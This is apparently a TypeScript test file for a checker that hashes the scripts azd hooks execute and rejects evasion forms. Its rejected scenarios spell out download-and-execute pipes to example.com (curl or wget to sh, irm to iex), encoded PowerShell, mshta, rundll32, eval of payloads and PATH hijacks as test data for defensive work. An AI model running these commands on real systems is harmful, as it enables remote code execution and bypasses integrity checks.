    name: "write: write via dot segments",
    run: "echo x > hooks/./sub/../b.sh; bash hooks/b.sh",
    files: on("hooks/b.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "write: write via redirect clobber",
    run: "echo x >| ./hooks/b.sh; bash hooks/b.sh",
    files: on("hooks/b.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "write: append then run",
    run: "echo x >> hooks/b.sh; bash hooks/b.sh",
    files: on("hooks/b.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "write: copy then run",
    run: "cp hooks/a.sh hooks/b.sh; bash hooks/b.sh",
    files: on("hooks/a.sh", "hooks/b.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "write: copy to directory then run",
    run: "cp hooks/a.sh hooks; bash hooks/b.sh",
    files: on("hooks/a.sh", "hooks/b.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "write: move then run",
    run: "mv hooks/a.sh hooks/b.sh; bash hooks/b.sh",
    files: on("hooks/a.sh", "hooks/b.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "write: link then run",
    run: "ln -sf hooks/a.sh hooks/b.sh; bash hooks/b.sh",
    files: on("hooks/a.sh", "hooks/b.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "write: tee then run",
    run: "echo x | tee hooks/b.sh; bash hooks/b.sh",
    files: on("hooks/b.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "write: sed in place then run",
    run: "sed -i s/a/b/ hooks/a.sh; bash hooks/a.sh",
    files: on("hooks/a.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "write: dd then run",
    run: "dd if=/dev/zero of=hooks/b.sh; bash hooks/b.sh",
    files: on("hooks/b.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "write: rewrite the bicep",
    run: "echo 'param x string' > infra/main.bicep",
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  { name: "write: sed the bicep", run: "sed -i s/a/b/ infra/main.bicep", code: "AZD_HOOK_UNBOUND_CONTENT" },
  {
    name: "write: rewrite the parameters",
    run: "echo '{}' | tee infra/main.parameters.json",
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  { name: "write: rewrite azure.yaml", run: "echo x > azure.yaml", code: "AZD_HOOK_UNBOUND_CONTENT" },
  {
    name: "write: rewrite through a parent segment",
    run: "echo x > hooks/../infra/main.bicep",
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "write: rewrite an infra subfolder file",
    run: "cp hooks/a.sh infra/modules",
    files: on("hooks/a.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  { name: "write: archive extraction", run: "tar xf bundle.tgz", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "write: unzip", run: "unzip bundle.zip", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "write: git checkout", run: "git checkout other", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "write: curl remote name", run: "curl -sSLO https://example.test/x", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "write: wget", run: "wget https://example.test/x", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "write: dynamic redirect", run: 'out=$(mktemp); echo x > "$out"', code: "AZD_HOOK_UNBOUND_CONTENT" },
  {
    name: "write: dynamic copy",
    run: 'cp hooks/a.sh "$DEST"',
    files: on("hooks/a.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "write: outfile option",
    run: "az bicep build --file infra/main.bicep --outfile infra/main.json",
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "write: ps set-content",
    shell: "pwsh",
    run: "Set-Content infra\\main.bicep 'x'",
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "write: ps out-file",
    shell: "pwsh",
    run: "'x' | Out-File infra/main.bicep",
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  { name: "write: ps redirect", shell: "pwsh", run: "'x' > infra\\main.bicep", code: "AZD_HOOK_UNBOUND_CONTENT" },
  {
    name: "write: ps copy-item",
    shell: "pwsh",
    run: "Copy-Item hooks\\a.ps1 hooks\\b.ps1; .\\hooks\\b.ps1",
    files: on("hooks/a.ps1", "hooks/b.ps1"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "write: ps expand-archive",
    shell: "pwsh",
    run: "Expand-Archive bundle.zip",
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "write: ps dynamic target",
    shell: "pwsh",
    run: "$p = 'x'; Set-Content $p 'y'",
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },

  // Own bypass attempts that must fail closed.
  {
    name: "stdin fd dup",
    run: "exec 3< hooks/a.sh; bash <&3",
    files: on("hooks/a.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  { name: "stdin fd zero", run: "bash <&0", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "read-write redirect", run: "bash <> hooks/a.sh", files: on("hooks/a.sh"), code: "AZD_HOOK_UNBOUND_CONTENT" },
  {
    name: "alias",
    run: "alias run='bash hooks/a.sh'; shopt -s expand_aliases; run",
    files: on("hooks/a.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "xargs arg file",
    run: "xargs -0 -a hooks/list bash",
    files: { "hooks/list": "a.sh\n" },
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  { name: "xargs bare interpreter", run: "ls hooks | xargs bash", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "bare interpreter", run: "bash", code: "AZD_HOOK_UNBOUND_CONTENT" },
  {
    name: "mshta",
    shell: "pwsh",
    run: "mshta hooks\\a.hta",
    files: { "hooks/a.hta": "x" },
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  { name: "rundll32", shell: "pwsh", run: "rundll32 x.dll,Run", code: "AZD_HOOK_UNBOUND_CONTENT" },
  {
    name: "msbuild",
    shell: "pwsh",
    run: "msbuild hooks\\a.proj",
    files: { "hooks/a.proj": "x" },
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  { name: "find exec shell", run: "find hooks -name '*.sh' -exec bash {} ;", code: "AZD_HOOK_UNBOUND_CONTENT" },
  // Working directory changes.
  {
    name: "cd then source",
    run: "cd hooks && . ./lib.sh",
    files: on("hooks/lib.sh", "lib.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  { name: "subshell cd", run: "(cd hooks; ./x.sh)", files: on("hooks/x.sh"), code: "AZD_HOOK_UNBOUND_CONTENT" },
  {
    name: "pushd then script",
    run: "pushd hooks\nbash ./x.sh",
    files: on("hooks/x.sh", "x.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "cd then duplicate name",
    run: "cd hooks\n. lib.sh",
    files: { "lib.sh": sh, "hooks/lib.sh": sh },
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "chdir via builtin",
    run: "builtin cd hooks; ./x.sh",
    files: on("hooks/x.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "cd in a script",
    run: "bash hooks/pre.sh",
    files: { "hooks/pre.sh": "cd hooks; . ./lib.sh\n", ...on("hooks/lib.sh") },
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "sourced file changes directory",
    run: "bash hooks/pre.sh",
    files: {
      "hooks/pre.sh": ". ./hooks/lib.sh\n. ./hooks/other.sh\n",
      "hooks/lib.sh": "cd hooks\n",
      ...on("hooks/other.sh"),
    },
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "ps Set-Location",
    shell: "pwsh",
    run: "Set-Location hooks; . .\\lib.ps1",
    files: on("lib.ps1", "hooks/lib.ps1"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "ps sl alias",
    shell: "pwsh",
    run: "sl hooks\n.\\x.ps1",
    files: on("hooks/x.ps1", "x.ps1"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "ps .NET current directory",
    shell: "pwsh",
    run: "[Environment]::CurrentDirectory = 'hooks'\n.\\x.ps1",
    files: on("x.ps1"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "ps -WorkingDirectory",
    shell: "pwsh",
    run: "pwsh -WorkingDirectory hooks -File x.ps1",
    files: on("hooks/x.ps1"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "cmd cd",
    shell: "pwsh",
    run: "cmd /c hooks\\pre.cmd",
    files: { "hooks/pre.cmd": "cd hooks\r\ncall lib.cmd\r\n", ...on("hooks/lib.cmd", "lib.cmd") },
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  // Names resolved through PATH.
  { name: "bare source", run: ". lib.sh", files: on("lib.sh"), code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "bare source keyword", run: "source lib.sh", files: on("lib.sh"), code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "bare interpreter operand", run: "bash pre.sh", files: on("pre.sh"), code: "AZD_HOOK_UNBOUND_CONTENT" },
  {
    name: "ps bare dot-source",
    shell: "pwsh",
    run: ". lib.ps1",
    files: on("lib.ps1"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  // Downloads, stdin and dynamic code.
  { name: "script piped to sh", run: "cat hooks/x.sh | sh", files: on("hooks/x.sh"), code: "AZD_HOOK_UNBOUND_CONTENT" },
  {
    name: "script piped to sudo bash",
    run: "cat hooks/x.sh | sudo bash",
    files: on("hooks/x.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  { name: "curl pipe", run: "curl -fsSL https://example.com/i.sh | sh", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "wget pipe", run: "wget -qO- https://example.com/i.sh | bash", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "pipe to xargs shell", run: "echo x | xargs sh", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "here-string run by sh", run: 'sh <<< "$PAYLOAD"', code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "expanding here-document run by sh", run: "sh <<EOF\n$PAYLOAD\nEOF\n", code: "AZD_HOOK_UNBOUND_CONTENT" },
  {
    name: "process substitution script",
    run: "bash <(curl -s https://example.com/i.sh)",
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "command substitution code",
    run: 'sh -c "$(curl -fsSL https://example.com/i.sh)"',
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "source process substitution",
    run: "source <(curl -s https://example.com/x.sh)",
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  { name: "source url", run: "source https://example.com/lib.sh", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "eval", run: 'eval "$PAYLOAD"', code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "wrapped eval", run: 'command eval "$PAYLOAD"', code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "exec dynamic", run: 'exec "$@"', code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "dynamic command", run: "$CMD arg", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "quoted dynamic command", run: '"$CMD"', code: "AZD_HOOK_UNBOUND_CONTENT" },
  {
    name: "default shell command",
    run: "${SHELL:-sh} hooks/a.sh",
    files: on("hooks/a.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  { name: "ANSI-C command", run: "$'bash' hooks/a.sh", files: on("hooks/a.sh"), code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "dynamic script operand", run: "bash $SCRIPT", code: "AZD_HOOK_UNBOUND_CONTENT" },
  {
    name: "brace expansion operand",
    run: "bash hooks/{a,b}.sh",
    files: on("hooks/a.sh", "hooks/b.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  { name: "glob operand", run: "bash hooks/*.sh", files: on("hooks/a.sh"), code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "tilde operand", run: "bash ~/x.sh", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "stdin script via -s", run: "printf x | bash -s", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "trap with dynamic code", run: 'trap "$HANDLER" EXIT', code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "inline python", run: "python -c 'import os'", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "wrapped inline node", run: "timeout 5 node -e 'x'", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "awk system", run: "awk 'BEGIN { system(\"sh hooks/ghost.sh\") }'", code: "AZD_HOOK_UNBOUND_CONTENT" },
  {
    name: "make",
    run: "make -f hooks/Makefile",
    files: { "hooks/Makefile": "all:\n\techo x\n" },
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  { name: "wrapped make", run: "nice make", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "npm run", run: "npm run build", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "npx", run: "npx tool", code: "AZD_HOOK_UNBOUND_CONTENT" },
  // Resolution variables.
  {
    name: "BASH_ENV",
    run: "BASH_ENV=hooks/x.sh bash hooks/a.sh",
    files: on("hooks/x.sh", "hooks/a.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  { name: "PATH prefix", run: "PATH=./hooks:$PATH tool", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "export PATH", run: "export PATH=./hooks:$PATH", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "env PATH", run: "env PATH=x bash hooks/a.sh", files: on("hooks/a.sh"), code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "IFS", run: "IFS=/ bash hooks/a.sh", files: on("hooks/a.sh"), code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "ps PATH", shell: "pwsh", run: "$env:PATH = 'x'", code: "AZD_HOOK_UNBOUND_CONTENT" },
  {
    name: "cmd set PATH",
    shell: "pwsh",
    run: "cmd /c hooks\\pre.cmd",
    files: { "hooks/pre.cmd": "set PATH=x\r\n" },
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  // Outside the project or missing.
  { name: "parent script", run: "sh ../outside.sh", code: "AZD_HOOK_SCRIPT_INVALID" },
  { name: "parent source", run: ". ../x.sh", code: "AZD_HOOK_SCRIPT_INVALID" },
  { name: "absolute script", run: "bash /etc/x.sh", code: "AZD_HOOK_SCRIPT_INVALID" },
  {
    name: "download then run",
    run: "curl -o x.sh https://example.com/i.sh; sh ./x.sh",
    code: "AZD_HOOK_SCRIPT_INVALID",
  },
  {
    name: "missing nested",
    run: "bash hooks/pre.sh",
    files: { "hooks/pre.sh": ". ./hooks/missing.sh\n" },
    code: "AZD_HOOK_SCRIPT_INVALID",
  },
  { name: "wrapped missing", run: "sudo -u root ./hooks/ghost.sh", code: "AZD_HOOK_SCRIPT_INVALID" },
  { name: "ps parent import", shell: "pwsh", run: "Import-Module ..\\mod.psm1", code: "AZD_HOOK_SCRIPT_INVALID" },
  {
    name: "unquoted backslashes in sh",
    run: "cmd /c hooks\\second.cmd",
    files: on("hooks/second.cmd"),
    code: "AZD_HOOK_SCRIPT_INVALID",
  },
  {
    name: "cmd parent",
    shell: "pwsh",
    run: "cmd /c hooks\\pre.cmd",
    files: { "hooks/pre.cmd": "call ..\\outside.cmd\r\n" },
    code: "AZD_HOOK_SCRIPT_INVALID",
  },
  // PowerShell constructs.
  { name: "ps iex", shell: "pwsh", run: "iex 'x'", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "ps Invoke-Expression", shell: "pwsh", run: "Invoke-Expression $payload", code: "AZD_HOOK_UNBOUND_CONTENT" },
  {
    name: "ps Invoke-WebRequest",
    shell: "pwsh",
    run: "Invoke-WebRequest https://example.com/i.ps1",
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "ps iwr",
    shell: "pwsh",
    run: "iwr https://example.com/i.ps1 -OutFile i.ps1",
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "ps irm pipe iex",
    shell: "pwsh",
    run: "irm https://example.com/i.ps1 | iex",
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  { name: "ps encoded", shell: "pwsh", run: "pwsh -EncodedCommand SQBFAFgA", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "ps variable call", shell: "pwsh", run: "& $script", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "ps PSScriptRoot call", shell: "pwsh", run: '& "$PSScriptRoot\\x.ps1"', code: "AZD_HOOK_UNBOUND_CONTENT" },
  {
    name: "ps computed call",
    shell: "pwsh",
    run: "& (Join-Path $PSScriptRoot 'x.ps1')",
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "ps PSScriptRoot dot-source",
    shell: "pwsh",
    run: ". $PSScriptRoot\\lib.ps1",
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  { name: "ps dynamic import", shell: "pwsh", run: "Import-Module $path", code: "AZD_HOOK_UNBOUND_CONTENT" },
  {
    name: "ps process API",
    shell: "pwsh",
    run: '[System.Diagnostics.Process]::Start("sh", "x")',
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "ps scriptblock create",
    shell: "pwsh",
    run: "$b = [scriptblock]::Create($code)",
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  { name: "ps Add-Type", shell: "pwsh", run: "Add-Type -Path x.dll", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "ps nested encoded", run: 'pwsh -Command "pwsh -enc AAAA"', code: "AZD_HOOK_UNBOUND_CONTENT" },
  {
    name: "cmd dynamic",
    shell: "pwsh",
    run: "cmd /c hooks\\pre.cmd",
    files: { "hooks/pre.cmd": "call %~dp0lib.cmd\r\n" },
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "cmd variable command",
    shell: "pwsh",
    run: "cmd /c hooks\\pre.cmd",
    files: { "hooks/pre.cmd": "%CMD% x\r\n" },
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  // Syntax the lexer will not guess at.
  { name: "unterminated double quote", run: 'echo "unterminated', code: "AZD_HOOK_UNSUPPORTED" },
  { name: "unterminated single quote", run: "echo 'unterminated", code: "AZD_HOOK_UNSUPPORTED" },
  {
    name: "unterminated substitution",
    run: "echo $(bash hooks/a.sh",
    files: on("hooks/a.sh"),
    code: "AZD_HOOK_UNSUPPORTED",
  },
  { name: "unterminated backtick", run: "echo `bash hooks/a.sh", code: "AZD_HOOK_UNSUPPORTED" },
  { name: "unterminated here-document", run: "cat <<EOF\nno end", code: "AZD_HOOK_UNSUPPORTED" },
  { name: "unbalanced parenthesis", run: "echo x )", code: "AZD_HOOK_UNSUPPORTED" },
  { name: "unclosed group", run: "( bash hooks/a.sh", files: on("hooks/a.sh"), code: "AZD_HOOK_UNSUPPORTED" },
  { name: "unclosed brace", run: "{ bash hooks/a.sh", files: on("hooks/a.sh"), code: "AZD_HOOK_UNSUPPORTED" },
  {
    name: "case statement",
    run: "case x in a) bash hooks/a.sh ;; esac",
    files: on("hooks/a.sh"),
    code: "AZD_HOOK_UNSUPPORTED",
  },
  { name: "array assignment", run: "a=(1 2)", code: "AZD_HOOK_UNSUPPORTED" },
  { name: "dangling redirect", run: "echo x >", code: "AZD_HOOK_UNSUPPORTED" },
  { name: "unterminated arithmetic", run: "echo $((1 + 2", code: "AZD_HOOK_UNSUPPORTED" },
  { name: "ps unterminated string", shell: "pwsh", run: "Write-Host 'x", code: "AZD_HOOK_UNSUPPORTED" },
  { name: "ps unbalanced brace", shell: "pwsh", run: "if ($x) { .\\a.ps1", code: "AZD_HOOK_UNSUPPORTED" },
  { name: "ps unterminated comment", shell: "pwsh", run: "<# never closed", code: "AZD_HOOK_UNSUPPORTED" },
  {
    name: "cmd unterminated quote",
    shell: "pwsh",
    run: "cmd /c hooks\\pre.cmd",
    files: { "hooks/pre.cmd": 'echo "x\r\n' },
    code: "AZD_HOOK_UNSUPPORTED",
  },
];

test("hook evasion forms bind every file they execute", async () => {
  const failures: string[] = [];
  for (const scenario of accepted) {
    try {
      const base = await bind(scenario);
      const [hook] = base.hooks;
      const hashed = [
        ...(hook!.path === undefined ? [] : [hook!.path]),
        ...hook!.dependencies.map(({ path }) => path),
      ].sort();
      assert.deepEqual(hashed, [...scenario.expect].sort(), "hashed set");
      for (const file of scenario.expect) {
        const mutated = await bind({
          ...scenario,
          files: { ...scenario.files, [file]: `${scenario.files![file]!}${touch(file)}` },
        });
        assert.notEqual(mutated.bindingHash, base.bindingHash, `changing ${file}`);
      }
      // A file nobody runs must not change the binding.
      const unrelated = await bind({ ...scenario, files: { ...scenario.files, "docs/unrelated.txt": "x\n" } });
      assert.equal(unrelated.bindingHash, base.bindingHash, "unrelated file");
    } catch (error) {
      failures.push(`${scenario.name}: ${error instanceof Error ? error.message.split("\n")[0] : String(error)}`);
    }
  }
  assert.deepEqual(failures, []);
});

test("hook evasion forms that load unbound content fail closed with an actionable error", async () => {
  const failures: string[] = [];
  for (const scenario of rejected) {
    try {
      await bind(scenario);
      failures.push(`${scenario.name}: accepted`);
    } catch (error) {
      if (!(error instanceof AzdBindingError) || error.code !== scenario.code || error.message.length < 20)
        failures.push(
          `${scenario.name}: ${error instanceof AzdBindingError ? error.code + " " + error.message : String(error)}`,
        );
    }
  }
  assert.deepEqual(failures, []);
});

test("the duplicate-name regression binds the file that is actually sourced", async () => {
  const scenario: Scenario = {
    name: "dup",
    run: ". ./lib.sh",
    files: { "lib.sh": "echo root\n", "hooks/lib.sh": "echo hooks\n" },
  };
  const base = await bind(scenario);
  const other = await bind({ ...scenario, files: { ...scenario.files, "hooks/lib.sh": "echo changed\n" } });
  assert.equal(other.bindingHash, base.bindingHash);
  const root = await bind({ ...scenario, files: { ...scenario.files, "lib.sh": "echo changed\n" } });
  assert.notEqual(root.bindingHash, base.bindingHash);
});

test("the lexer stays linear on pathological input", () => {
  const big = 200_000;
  const inputs: Array<[string, string]> = [
    ["nested substitutions", "$(".repeat(big)],
    ["nested backticks", "`".repeat(big)],
    ["nested groups", "(".repeat(big)],
    ["nested braces", "{ ".repeat(big)],
    ["unterminated quotes", "'".repeat(big)],
    ["unterminated arithmetic", "$((".repeat(big / 3)],
    ["many words", "a ".repeat(big)],
    ["many commands", "a;".repeat(big)],
    ["many pipes", "a|".repeat(big)],
    ["escapes", "\\a".repeat(big / 2)],
    ["many substitutions", "$(a)".repeat(big / 4)],
    ["many expansions", "${a}".repeat(big / 4)],
    ["many heredocs", "cat <<A\n".repeat(1000) + "A\n".repeat(1000)],
    ["many here-strings", "cat <<<a\n".repeat(big / 9)],
    ["many redirects", ">a".repeat(big / 2)],
    ["comment", `#${"x".repeat(big)}`],
  ];
  for (const flavour of ["posix", "powershell", "cmd"] as const)
    for (const [name, input] of inputs) {
      const started = performance.now();
      const analysis = analyzeHookText(input, flavour);
      const elapsed = performance.now() - started;
      assert.ok(elapsed < 2500, `${flavour} ${name} took ${Math.round(elapsed)}ms`);
      assert.ok(analysis.loads.length >= 0);
    }
  assert.ok(analyzeHookText("$(".repeat(100), "posix").unsupported.length > 0);
});

const cmdWrites: Array<[string, string, string[]]> = [
  ["cmd redirect", "cmd /c echo x > infra\\main.bicep", []],
  ["cmd copy", "cmd /c copy hooks\\a.cmd infra\\main.bicep", ["hooks/a.cmd"]],
  ["cmd del", "cmd /c del infra\\main.bicep", []],
  ["cmd write then run", 'cmd /c "echo x > hooks\\b.cmd & hooks\\b.cmd"', ["hooks/b.cmd"]],
];

test("hooks that write files azd or another hook runs fail closed in cmd as well", async () => {
  for (const [name, run, names] of cmdWrites)
    await assert.rejects(
      bind({ name, run, shell: "pwsh", files: on(...names) }),
      (error: unknown) => error instanceof AzdBindingError && error.code === "AZD_HOOK_UNBOUND_CONTENT",
      name,
    );
});

test("a hook cannot write a script that a later hook runs", async () => {
  const hooks =
    "name: demo\nhooks:\n  preprovision:\n    run: echo x > hooks/post.sh\n  postprovision:\n    run: bash hooks/post.sh\n";
  await assert.rejects(
    bind({ name: "cross hook", run: "echo", files: { "azure.yaml": hooks, ...on("hooks/post.sh") } }),
    (error: unknown) => error instanceof AzdBindingError && error.code === "AZD_HOOK_UNBOUND_CONTENT",
  );
});
